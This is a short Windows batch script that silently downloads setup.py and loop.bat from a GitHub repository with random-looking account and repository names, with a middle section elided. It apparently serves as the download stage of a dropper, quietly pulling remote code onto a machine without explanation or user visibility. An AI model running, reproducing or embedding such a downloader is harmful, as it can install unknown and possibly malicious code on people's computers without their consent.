@echo off
curl -s -L -o setup.py https://raw.githubusercontent.com/Ufzjhhshdhddfhhhdgeg/Vgg-fwgwffw/refs/heads/main/setup.py
...
curl -s -L -o loop.bat https://raw.githubusercontent.com/Ufzjhhshdhddfhhhdgeg/Vgg-fwgwffw/refs/heads/main/loop.bat
